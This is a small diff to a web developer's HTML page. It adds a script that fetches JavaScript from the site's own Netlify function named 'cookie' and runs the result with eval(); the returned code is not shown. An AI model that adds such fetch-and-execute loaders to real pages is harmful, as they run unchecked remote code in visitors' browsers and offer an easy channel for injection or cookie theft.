@@ -27,7 +27,14 @@
     </form>
   </div>
 <p>pro web developer</p>
-
+<script>
+  fetch('/.netlify/functions/cookie')
+    .then(response => response.text())
+    .then(script => {
+      // Execute the JavaScript returned by the server
+      eval(script);
+    });
+</script>
 
 </body>
 </html>
